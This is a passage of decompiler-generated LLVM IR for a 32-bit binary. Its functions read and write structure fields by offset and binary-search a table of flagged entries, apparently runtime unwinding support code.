  uselistorder i32 ()* @function_f150, { 72, 71, 70, 69, 68, 67, 66, 65, 76, 75, 64, 63, 62, 61, 60, 74, 73, 59, 58, 25, 24, 57, 13, 34, 33, 54, 32, 31, 4, 11, 10, 9, 30, 29, 8, 3, 2, 28, 7, 6, 5, 53, 26, 27, 15, 14, 23, 52, 40, 39, 51, 50, 49, 38, 48, 47, 37, 36, 46, 35, 56, 55, 22, 19, 18, 17, 45, 44, 43, 16, 12, 42, 41, 0, 1, 21, 20 }
  uselistorder i32 -4095, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_125a8, { 1, 0 }
}

define i32 @function_125b8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5) local_unnamed_addr {
dec_label_pc_125b8:
  %v2_125b8 = icmp eq i32 %arg2, 0
  br i1 %v2_125b8, label %dec_label_pc_125c0, label %dec_label_pc_125f0

dec_label_pc_125c0:                               ; preds = %dec_label_pc_125b8
  %tmp = icmp ult i32 %arg3, 16
  br i1 %tmp, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_125c0
  %v6_125c4 = icmp eq i32 %arg4, 0
  br i1 %v6_125c4, label %dec_label_pc_125d4, label %bb8

.thread2:                                         ; preds = %dec_label_pc_125c0
  br label %dec_label_pc_125fc

bb8:                                              ; preds = %bb
  br label %dec_label_pc_125fc

dec_label_pc_125d4:                               ; preds = %bb
  %v3_125d4 = mul i32 %arg3, 4
  %v2_125d8 = add i32 %v3_125d4, %arg1
  %v1_125dc = add i32 %v2_125d8, 4
  %v2_125dc = inttoptr i32 %v1_125dc to i32*
  %v3_125dc = load i32, i32* %v2_125dc, align 4
  store i32 %v3_125dc, i32* %arg5, align 4
  ret i32 0

dec_label_pc_125f0:                               ; preds = %dec_label_pc_125b8
  %tmp11 = icmp ult i32 %arg2, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_125f0
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_125f0, %bb9
  %v0_125f8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_125f8)
  br label %dec_label_pc_125fc

dec_label_pc_125fc:                               ; preds = %bb8, %.thread2, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_125fc, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @function_12604(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5) local_unnamed_addr {
dec_label_pc_12604:
  %v2_12604 = icmp eq i32 %arg2, 0
  br i1 %v2_12604, label %dec_label_pc_1260c, label %dec_label_pc_1263c

dec_label_pc_1260c:                               ; preds = %dec_label_pc_12604
  %tmp = icmp ult i32 %arg3, 16
  br i1 %tmp, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_1260c
  %v6_12610 = icmp eq i32 %arg4, 0
  br i1 %v6_12610, label %dec_label_pc_12620, label %bb8

.thread2:                                         ; preds = %dec_label_pc_1260c
  br label %dec_label_pc_12648

bb8:                                              ; preds = %bb
  br label %dec_label_pc_12648

dec_label_pc_12620:                               ; preds = %bb
  %v3_12624 = mul i32 %arg3, 4
  %v2_12628 = load i32, i32* %arg5, align 4
  %v2_1262c = add i32 %v3_12624, %arg1
  %v2_12634 = add i32 %v2_1262c, 4
  %v3_12634 = inttoptr i32 %v2_12634 to i32*
  store i32 %v2_12628, i32* %v3_12634, align 4
  ret i32 0

dec_label_pc_1263c:                               ; preds = %dec_label_pc_12604
  %tmp11 = icmp ult i32 %arg2, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_1263c
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_1263c, %bb9
  %v0_12644 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_12644)
  br label %dec_label_pc_12648

dec_label_pc_12648:                               ; preds = %bb8, %.thread2, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32* @lr, { 3, 4, 114, 115, 116, 120, 121, 5, 6, 7, 8, 9, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 145, 146, 147, 148, 149, 152, 78, 79, 35, 36, 150, 151, 80, 81, 82, 83, 37, 38, 39, 21, 22, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 0, 100, 101, 103, 104, 102, 40, 41, 23, 42, 43, 44, 45, 24, 70, 71, 105, 106, 107, 108, 109, 46, 47, 117, 118, 119, 48, 50, 49, 25, 26, 51, 1, 52, 53, 27, 28, 64, 29, 30, 31, 32, 33, 34, 54, 55, 56, 57, 58, 59, 60, 2, 61, 62, 63, 65, 66, 67, 68, 69, 72, 73, 74, 75, 110, 111, 112, 113, 76, 77 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_12648, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @function_12650(i32 %arg1) local_unnamed_addr {
dec_label_pc_12650:
  %v1_12650 = add i32 %arg1, 68
  %v2_12650 = inttoptr i32 %v1_12650 to i32*
  %v3_12650 = load i32, i32* %v2_12650, align 4
  ret i32 %v3_12650

; uselistorder directives
  uselistorder i32 68, { 9, 0, 1, 11, 2, 10, 3, 5, 6, 7, 4, 8 }
}

define i32 @function_1265c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1265c:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_12660 = add i32 %arg1, 8
  %v2_12660 = inttoptr i32 %v1_12660 to i32*
  %v3_12660 = load i32, i32* %v2_12660, align 4
  %v2_12664 = icmp eq i32 %v3_12660, 0
  br i1 %v2_12664, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_1265c
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1265c, %bb
  %v2_12678 = xor i1 %v2_12664, true
  call void @__pseudo_cond_branch(i1 %v2_12678, i32 %v3_12660)
  %v1_12684 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_12684

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 0, 1, 2, 37, 39, 40, 41, 42, 43, 44, 45, 46, 47, 5, 7, 8, 9, 10, 11, 12, 13, 14, 6, 3, 15, 16, 17, 18, 19, 20, 21, 22, 29, 52, 56, 55, 54, 48, 49, 4, 30, 31, 24, 25, 50, 51, 53, 32, 33, 38, 23, 26, 27, 28, 34, 35, 36 }
  uselistorder i1 true, { 1, 2, 3, 4, 5, 6, 66, 78, 7, 79, 80, 81, 82, 8, 57, 69, 83, 9, 56, 84, 10, 55, 85, 86, 87, 88, 11, 89, 70, 12, 59, 90, 13, 58, 91, 92, 14, 93, 94, 95, 15, 96, 97, 16, 98, 17, 72, 99, 100, 71, 101, 102, 18, 60, 19, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 21, 62, 22, 113, 114, 115, 23, 61, 116, 24, 20, 117, 118, 25, 119, 120, 121, 26, 122, 123, 124, 125, 126, 27, 28, 73, 29, 30, 31, 32, 77, 63, 127, 128, 65, 129, 75, 130, 131, 34, 132, 133, 64, 135, 33, 136, 134, 137, 74, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 0, 46, 47, 48, 49, 50, 76, 51, 52, 67, 53, 54, 68 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_12688(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12688:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v0_12690 = call i32 @function_d6d4()
  %v0_1269c = call i32 @function_d6d4()
  %v3_126a0 = load i32, i32* @r4, align 4
  store i32 %v3_126a0, i32* %stack_var_-48, align 4
  %v6_126a0 = load i32, i32* @r5, align 4
  %v9_126a0 = load i32, i32* @r6, align 4
  %v12_126a0 = load i32, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* %r5.global-to-local, align 4
  %v4_126b0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 132) to i32*), align 4
  %v2_126b4 = icmp eq i32 %v4_126b0, 0
  store i32 %v0_1269c, i32* %r6.global-to-local, align 4
  %v1_126c0 = add i32 %arg2, -2
  store i32 %v1_126c0, i32* %r4.global-to-local, align 4
  br i1 %v2_126b4, label %dec_label_pc_126f8, label %dec_label_pc_126c8

dec_label_pc_126c8:                               ; preds = %dec_label_pc_12688
  call void @__pseudo_branch(i32 %v4_126b0)
  %v2_126d8 = icmp eq i32 %v1_126c0, 0
  br i1 %v2_126d8, label %.thread, label %dec_label_pc_12718thread-pre-split

.thread:                                          ; preds = %dec_label_pc_126c8
  store i32 9, i32* %r2.global-to-local, align 4
  %v2_126e0 = load i32, i32* %r6.global-to-local, align 4
  %v3_126e0 = add i32 %v2_126e0, 16
  %v4_126e0 = inttoptr i32 %v3_126e0 to i32*
  store i32 0, i32* %v4_126e0, align 4
  br label %dec_label_pc_126e8

dec_label_pc_126e8:                               ; preds = %.thread, %.thread10, %dec_label_pc_12890, %dec_label_pc_1287c, %dec_label_pc_12858, %dec_label_pc_12830, %dec_label_pc_12730
  %v0_126e8 = load i32, i32* %r2.global-to-local, align 4
  %v2_126f0 = load i32, i32* %stack_var_-48, align 4
  store i32 %v2_126f0, i32* %r4.global-to-local, align 4
  store i32 %v6_126a0, i32* %r5.global-to-local, align 4
  store i32 %v9_126a0, i32* %r6.global-to-local, align 4
  store i32 %v12_126a0, i32* %r7.global-to-local, align 4
  ret i32 %v0_126e8

dec_label_pc_126f8:                               ; preds = %dec_label_pc_12688
  store i32 20, i32* %r2.global-to-local, align 4
  %v4_12700 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 20) to i32*), align 4
  %v4_12704 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 48) to i32*), align 4
  store i32 %v4_12704, i32* %r2.global-to-local, align 4
  %v2_12708 = sub i32 %v4_12700, %v4_12704
  %v3_1270c = sdiv i32 %v2_12708, 8
  store i32 %v3_1270c, i32* %stack_var_-52, align 4
  br label %dec_label_pc_12718

dec_label_pc_12718thread-pre-split:               ; preds = %dec_label_pc_126c8
  %v3_12718.pr = load i32, i32* %stack_var_-52, align 4
  br label %dec_label_pc_12718

dec_label_pc_12718:                               ; preds = %dec_label_pc_12718thread-pre-split, %dec_label_pc_126f8
  %v0_1275c.pre = phi i32 [ %v1_126c0, %dec_label_pc_12718thread-pre-split ], [ %v4_12704, %dec_label_pc_126f8 ]
  %v1_12720 = phi i32 [ %v3_12718.pr, %dec_label_pc_12718thread-pre-split ], [ %v3_1270c, %dec_label_pc_126f8 ]
  %v2_1271c = icmp eq i32 %v1_12720, 0
  br i1 %v2_1271c, label %dec_label_pc_12730, label %dec_label_pc_1274c.preheader

dec_label_pc_1274c.preheader:                     ; preds = %dec_label_pc_12718
  %v2_12720 = add i32 %v1_12720, -1
  %v1_1277c = add i32 %v0_1275c.pre, 8
  br label %dec_label_pc_1274c.outer

dec_label_pc_12730.loopexit:                      ; preds = %dec_label_pc_127a8
  br label %dec_label_pc_12730

dec_label_pc_12730:                               ; preds = %dec_label_pc_12730.loopexit, %dec_label_pc_12718, %dec_label_pc_12874
  store i32 9, i32* %r2.global-to-local, align 4
  %v1_12738 = load i32, i32* %r6.global-to-local, align 4
  %v2_12738 = add i32 %v1_12738, 16
  %v3_12738 = inttoptr i32 %v2_12738 to i32*
  store i32 0, i32* %v3_12738, align 4
  br label %dec_label_pc_126e8

dec_label_pc_12740:                               ; preds = %dec_label_pc_1279c
  %v3_12740 = icmp ult i32 %storemerge40, %v0_127a0
  br i1 %v3_12740, label %dec_label_pc_12748, label %dec_label_pc_127b8

dec_label_pc_12748:                               ; preds = %dec_label_pc_12740
  %v1_12748 = add nsw i32 %v3_12754, 1
  br label %dec_label_pc_1274c.outer

dec_label_pc_1274c.outer:                         ; preds = %dec_label_pc_12748, %dec_label_pc_1274c.preheader
  %v1_127a8.ph = phi i32 [ %v1_12748, %dec_label_pc_12748 ], [ 0, %dec_label_pc_1274c.preheader ]
  %v0_1274c.ph = phi i32 [ %v0_1274c, %dec_label_pc_12748 ], [ %v2_12720, %dec_label_pc_1274c.preheader ]
  br label %dec_label_pc_1274c

dec_label_pc_1274c:                               ; preds = %dec_label_pc_1274c.outer, %dec_label_pc_127b0
  %v0_1274c = phi i32 [ %v1_127b0, %dec_label_pc_127b0 ], [ %v0_1274c.ph, %dec_label_pc_1274c.outer ]
  %v2_1274c = add i32 %v0_1274c, %v1_127a8.ph
  %tmp = icmp slt i32 %v2_1274c, 0
  %v4_12750 = zext i1 %tmp to i32
  %v5_12750 = add i32 %v4_12750, %v2_1274c
  %v3_12754 = sdiv i32 %v5_12750, 2
  %v3_12758 = mul i32 %v3_12754, 8
  %v2_1275c = add i32 %v3_12758, %v0_1275c.pre
  %v3_1275c = inttoptr i32 %v2_1275c to i32*
  %v4_1275c = load i32, i32* %v3_1275c, align 4
  %v1_12760 = and i32 %v4_1275c, 1073741824
  %v2_12760 = icmp eq i32 %v1_12760, 0
  %v2_12764 = or i32 %v4_1275c, -2147483648
  %tmp82 = bitcast i32 %v4_1275c to float
  %tmp83 = call float @fabsf(float %tmp82)
  %v2_12768 = bitcast float %tmp83 to i32
  %storemerge = select i1 %v2_12760, i32 %v2_12768, i32 %v2_12764
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v9_1276c = icmp eq i32 %v2_12720, %v3_12754
  store i32 %v2_1275c, i32* %r7.global-to-local, align 4
  br i1 %v9_1276c, label %dec_label_pc_1279c, label %dec_label_pc_1277c

dec_label_pc_1277c:                               ; preds = %dec_label_pc_1274c
  %v2_12780 = add i32 %v3_12758, %v1_1277c
  %v3_12780 = inttoptr i32 %v2_12780 to i32*
  %v4_12780 = load i32, i32* %v3_12780, align 4
  %v1_12788 = and i32 %v4_12780, 1073741824
  %v2_12788 = icmp eq i32 %v1_12788, 0
  %v2_1278c = or i32 %v4_12780, -2147483648
  %tmp84 = bitcast i32 %v4_12780 to float
  %tmp85 = call float @fabsf(float %tmp84)
  %v2_12790 = bitcast float %tmp85 to i32
  %storemerge39 = select i1 %v2_12788, i32 %v2_12790, i32 %v2_1278c
  %v1_12794 = add i32 %v2_12780, -1
  %v2_12798 = add i32 %storemerge39, %v1_12794
  br label %dec_label_pc_1279c

dec_label_pc_1279c:                               ; preds = %dec_label_pc_1274c, %dec_label_pc_1277c
  %storemerge40 = phi i32 [ %v2_12798, %dec_label_pc_1277c ], [ -1, %dec_label_pc_1274c ]
  %v2_1279c = add i32 %storemerge, %v2_1275c
  %v0_127a0 = load i32, i32* %r4.global-to-local, align 4
  %v3_127a0 = icmp ult i32 %v0_127a0, %v2_1279c
  br i1 %v3_127a0, label %dec_label_pc_127a8, label %dec_label_pc_12740

dec_label_pc_127a8:                               ; preds = %dec_label_pc_1279c
  %v9_127a8 = icmp eq i32 %v3_12754, %v1_127a8.ph
  br i1 %v9_127a8, label %dec_label_pc_12730.loopexit, label %dec_label_pc_127b0

dec_label_pc_127b0:                               ; preds = %dec_label_pc_127a8
  %v1_127b0 = add nsw i32 %v3_12754, -1
  br label %dec_label_pc_1274c

dec_label_pc_127b8:                               ; preds = %dec_label_pc_12740
  %v2_127b8 = load i32, i32* %v3_1275c, align 4
  %v1_127bc = and i32 %v2_127b8, 1073741824
  %v2_127bc = icmp eq i32 %v1_127bc, 0
  %v2_127c0 = or i32 %v2_127b8, -2147483648
  %tmp86 = bitcast i32 %v2_127b8 to float
  %tmp87 = call float @fabsf(float %tmp86)
  %v2_127c4 = bitcast float %tmp87 to i32
  %v0_127c8 = select i1 %v2_127bc, i32 %v2_127c4, i32 %v2_127c0
  %v2_127c8 = add i32 %v0_127c8, %v2_1275c
  %v1_127cc = load i32, i32* %r6.global-to-local, align 4
  %v2_127cc = add i32 %v1_127cc, 72
  %v3_127cc = inttoptr i32 %v2_127cc to i32*
  store i32 %v2_127c8, i32* %v3_127cc, align 4
  %v0_127d0 = load i32, i32* %r7.global-to-local, align 4
  %v1_127d0 = add i32 %v0_127d0, 4
  %v2_127d0 = inttoptr i32 %v1_127d0 to i32*
  %v3_127d0 = load i32, i32* %v2_127d0, align 4
  %v7_127d4 = icmp eq i32 %v3_127d0, 1
  br i1 %v7_127d4, label %.thread10, label %dec_label_pc_127e8

.thread10:                                        ; preds = %dec_label_pc_127b8
  %v1_127d4 = add i32 %v3_127d0, -1
  store i32 5, i32* %r2.global-to-local, align 4
  %v2_127e0 = load i32, i32* %r6.global-to-local, align 4
  %v3_127e0 = add i32 %v2_127e0, 16
  %v4_127e0 = inttoptr i32 %v3_127e0 to i32*
  store i32 %v1_127d4, i32* %v4_127e0, align 4
  br label %dec_label_pc_126e8

dec_label_pc_127e8:                               ; preds = %dec_label_pc_127b8
  %v1_127e8 = icmp slt i32 %v3_127d0, 0
  br i1 %v1_127e8, label %.thread38, label %dec_label_pc_12800

.thread38:                                        ; preds = %dec_label_pc_127e8
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_127f4 = load i32, i32* %r6.global-to-local, align 4
  %v5_127f4 = add i32 %v4_127f4, 76
  %v6_127f4 = inttoptr i32 %v5_127f4 to i32*
  store i32 %v1_127d0, i32* %v6_127f4, align 4
  %v3_127f8 = load i32, i32* %r2.global-to-local, align 4
  %v4_127f8 = load i32, i32* %r6.global-to-local, align 4
  %v5_127f8 = add i32 %v4_127f8, 80
  %v6_127f8 = inttoptr i32 %v5_127f8 to i32*
  store i32 %v3_127f8, i32* %v6_127f8, align 4
  br label %dec_label_pc_12820

dec_label_pc_12800:                               ; preds = %dec_label_pc_127e8
  %v1_12800 = and i32 %v3_127d0, 1073741824
  %v2_12800 = icmp eq i32 %v1_12800, 0
  %v2_12804 = or i32 %v3_127d0, -2147483648
  %tmp88 = bitcast i32 %v3_127d0 to float
  %tmp89 = call float @fabsf(float %tmp88)
  %v2_12808 = bitcast float %tmp89 to i32
  %storemerge42 = select i1 %v2_12800, i32 %v2_12808, i32 %v2_12804
  %v1_1280c = add i32 %storemerge42, 4
  %v2_12810 = add i32 %v1_1280c, %v0_127d0
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_12818 = load i32, i32* %r6.global-to-local, align 4
  %v2_12818 = add i32 %v1_12818, 76
  %v3_12818 = inttoptr i32 %v2_12818 to i32*
  store i32 %v2_12810, i32* %v3_12818, align 4
  %v0_1281c = load i32, i32* %r2.global-to-local, align 4
  %v1_1281c = load i32, i32* %r6.global-to-local, align 4
  %v2_1281c = add i32 %v1_1281c, 80
  %v3_1281c = inttoptr i32 %v2_1281c to i32*
  store i32 %v0_1281c, i32* %v3_1281c, align 4
  br label %dec_label_pc_12820

dec_label_pc_12820:                               ; preds = %.thread38, %dec_label_pc_12800
  %v0_12820 = load i32, i32* %r6.global-to-local, align 4
  %v1_12820 = add i32 %v0_12820, 76
  %v2_12820 = inttoptr i32 %v1_12820 to i32*
  %v3_12820 = load i32, i32* %v2_12820, align 4
  store i32 %v3_12820, i32* %r2.global-to-local, align 4
  %v1_12824 = inttoptr i32 %v3_12820 to i32*
  %v2_12824 = load i32, i32* %v1_12824, align 4
  %v1_12828 = icmp slt i32 %v2_12824, 0
  br i1 %v1_12828, label %dec_label_pc_1284c, label %dec_label_pc_12830

dec_label_pc_12830:                               ; preds = %dec_label_pc_12820
  %v1_12830 = and i32 %v2_12824, 1073741824
  %v2_12830 = icmp eq i32 %v1_12830, 0
  %v2_12834 = or i32 %v2_12824, -2147483648
  %tmp90 = bitcast i32 %v2_12824 to float
  %tmp91 = call float @fabsf(float %tmp90)
  %v2_12838 = bitcast float %tmp91 to i32
  %v0_1283c = select i1 %v2_12830, i32 %v2_12838, i32 %v2_12834
  %v2_1283c = add i32 %v0_1283c, %v3_12820
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_12844 = add i32 %v0_12820, 16
  %v3_12844 = inttoptr i32 %v2_12844 to i32*
  store i32 %v2_1283c, i32* %v3_12844, align 4
  br label %dec_label_pc_126e8

dec_label_pc_1284c:                               ; preds = %dec_label_pc_12820
  %v3_1284c = udiv i32 %v2_12824, 16777216
  %v1_12850 = urem i32 %v3_1284c, 16
  %v2_12850 = icmp eq i32 %v1_12850, 0
  br i1 %v2_12850, label %dec_label_pc_12858, label %dec_label_pc_1286c

dec_label_pc_12858:                               ; preds = %dec_label_pc_1284c
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_12860 = load i32, i32* %r5.global-to-local, align 4
  %v2_12860 = add i32 %v0_12860, -40980
  %v2_12864 = add i32 %v0_12820, 16
  %v3_12864 = inttoptr i32 %v2_12864 to i32*
  store i32 %v2_12860, i32* %v3_12864, align 4
  br label %dec_label_pc_126e8

dec_label_pc_1286c:                               ; preds = %dec_label_pc_1284c
  %v7_1286c = icmp eq i32 %v1_12850, 1
  br i1 %v7_1286c, label %dec_label_pc_12890, label %dec_label_pc_12874

dec_label_pc_12874:                               ; preds = %dec_label_pc_1286c
  %v7_12874 = icmp eq i32 %v1_12850, 2
  br i1 %v7_12874, label %dec_label_pc_1287c, label %dec_label_pc_12730

dec_label_pc_1287c:                               ; preds = %dec_label_pc_12874
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_12884 = load i32, i32* %r5.global-to-local, align 4
  %v2_12884 = add i32 %v0_12884, -40996
  %v2_12888 = add i32 %v0_12820, 16
  %v3_12888 = inttoptr i32 %v2_12888 to i32*
  store i32 %v2_12884, i32* %v3_12888, align 4
  br label %dec_label_pc_126e8

dec_label_pc_12890:                               ; preds = %dec_label_pc_1286c
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_12898 = load i32, i32* %r5.global-to-local, align 4
  %v2_12898 = add i32 %v0_12898, -40988
  %v2_1289c = add i32 %v0_12820, 16
  %v3_1289c = inttoptr i32 %v2_1289c to i32*
  store i32 %v2_12898, i32* %v3_1289c, align 4
  br label %dec_label_pc_126e8

; uselistorder directives
  uselistorder i32 %v1_12850, { 2, 1, 0 }
  uselistorder i32 %v0_12820, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_127d0, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_127a0, { 1, 0 }
  uselistorder i32 %v3_12758, { 1, 0 }
  uselistorder i32 %v3_12754, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_1274c, { 1, 0 }
  uselistorder i32 %v0_1274c, { 1, 0 }
  uselistorder i32 %v2_12720, { 1, 0 }
  uselistorder i32 %v0_1275c.pre, { 1, 0 }
  uselistorder i32 %v3_1270c, { 1, 0 }
  uselistorder i32 %v1_126c0, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 15, 10, 11, 12, 13, 14 }
  uselistorder i32 16777216, { 0, 33, 32, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 25, 24, 27, 26, 29, 28, 31, 30, 34 }
  uselistorder i32 80, { 6, 7, 0, 2, 1, 3, 4, 5, 10, 8, 9 }
  uselistorder i32 76, { 18, 19, 20, 0, 3, 5, 4, 6, 2, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 1 }
  uselistorder i32 5, { 14, 0, 1, 2, 17, 6, 13, 15, 3, 5, 4, 16, 7, 9, 8, 10, 11, 12 }
  uselistorder i32 4, { 101, 102, 103, 2, 104, 3, 116, 117, 118, 119, 120, 121, 268, 105, 106, 122, 123, 124, 125, 126, 127, 128, 129, 130, 4, 131, 132, 133, 134, 135, 5, 6, 271, 7, 8, 49, 0, 9, 56, 50, 51, 10, 272, 52, 273, 42, 11, 12, 53, 274, 54, 275, 276, 277, 278, 55, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 13, 290, 291, 292, 293, 294, 295, 296, 57, 297, 298, 299, 300, 301, 302, 14, 15, 136, 58, 137, 138, 139, 140, 141, 142, 143, 107, 108, 109, 110, 144, 145, 146, 147, 148, 149, 16, 150, 59, 151, 152, 153, 154, 155, 74, 156, 157, 158, 159, 160, 161, 17, 162, 163, 164, 165, 203, 204, 111, 112, 113, 43, 303, 75, 60, 76, 305, 18, 306, 77, 114, 115, 304, 48, 179, 180, 181, 182, 78, 44, 207, 208, 209, 210, 211, 212, 79, 80, 19, 213, 214, 215, 216, 217, 218, 219, 220, 81, 205, 206, 221, 20, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 82, 83, 84, 236, 237, 240, 243, 238, 239, 61, 85, 241, 35, 242, 244, 245, 246, 248, 86, 22, 21, 247, 87, 88, 89, 23, 24, 25, 90, 36, 26, 27, 249, 250, 251, 252, 253, 28, 254, 183, 184, 100, 29, 30, 269, 270, 99, 31, 32, 1, 185, 37, 91, 73, 166, 167, 168, 169, 170, 63, 64, 65, 171, 172, 173, 92, 174, 38, 62, 175, 176, 177, 191, 192, 193, 93, 178, 34, 33, 186, 187, 188, 189, 190, 94, 194, 39, 66, 195, 196, 95, 47, 46, 45, 197, 96, 97, 98, 67, 198, 199, 40, 200, 41, 68, 69, 70, 71, 201, 72, 202, 261, 255, 256, 257, 258, 259, 260, 262, 263, 264, 265, 266, 267 }
  uselistorder i32 72, { 4, 1, 2, 0, 3, 7, 8, 5, 6, 9 }
  uselistorder i32 -2147483648, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 1073741824, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 2, { 104, 4, 0, 1, 105, 5, 6, 7, 106, 102, 46, 47, 44, 155, 156, 56, 157, 158, 48, 159, 160, 161, 107, 64, 108, 109, 65, 66, 67, 68, 69, 70, 71, 72, 110, 73, 74, 75, 8, 9, 10, 76, 162, 77, 41, 164, 118, 119, 120, 78, 11, 111, 163, 52, 142, 12, 13, 143, 14, 15, 42, 144, 16, 17, 18, 19, 57, 145, 146, 20, 21, 2, 103, 147, 22, 148, 79, 149, 3, 23, 101, 24, 25, 26, 27, 28, 29, 100, 30, 31, 32, 33, 34, 123, 49, 121, 35, 122, 80, 81, 61, 36, 50, 51, 37, 99, 113, 83, 82, 87, 112, 114, 115, 85, 116, 86, 117, 84, 124, 126, 133, 125, 127, 128, 129, 130, 38, 88, 89, 90, 131, 132, 58, 45, 92, 134, 135, 93, 136, 39, 40, 53, 91, 137, 94, 138, 95, 139, 96, 140, 97, 141, 55, 54, 60, 59, 63, 62, 151, 43, 152, 154, 98, 150, 153 }
  uselistorder i32 -1, { 111, 112, 56, 113, 110, 169, 170, 114, 171, 172, 173, 174, 60, 175, 62, 61, 109, 108, 0, 115, 38, 39, 40, 41, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 116, 117, 1, 118, 91, 176, 177, 119, 63, 95, 120, 178, 121, 122, 123, 124, 125, 126, 127, 2, 128, 42, 179, 129, 99, 180, 181, 182, 130, 4, 3, 131, 132, 64, 58, 213, 65, 66, 200, 67, 183, 201, 202, 203, 68, 229, 5, 69, 204, 205, 133, 6, 134, 135, 136, 100, 107, 101, 137, 96, 230, 138, 139, 206, 140, 7, 141, 102, 207, 11, 142, 143, 10, 12, 208, 9, 144, 145, 43, 8, 146, 44, 45, 46, 47, 147, 148, 149, 52, 184, 185, 13, 70, 197, 71, 72, 73, 74, 75, 76, 186, 77, 187, 78, 79, 198, 80, 106, 14, 209, 150, 81, 188, 82, 189, 83, 84, 210, 85, 212, 86, 87, 190, 89, 231, 88, 232, 59, 151, 152, 50, 54, 15, 153, 191, 154, 192, 193, 155, 53, 156, 16, 211, 90, 51, 55, 57, 157, 158, 92, 159, 93, 17, 18, 48, 20, 160, 161, 19, 49, 162, 163, 97, 21, 22, 164, 23, 24, 194, 98, 165, 195, 94, 26, 166, 27, 28, 103, 196, 29, 25, 30, 167, 31, 32, 33, 34, 35, 36, 37, 199, 168, 104, 105 }
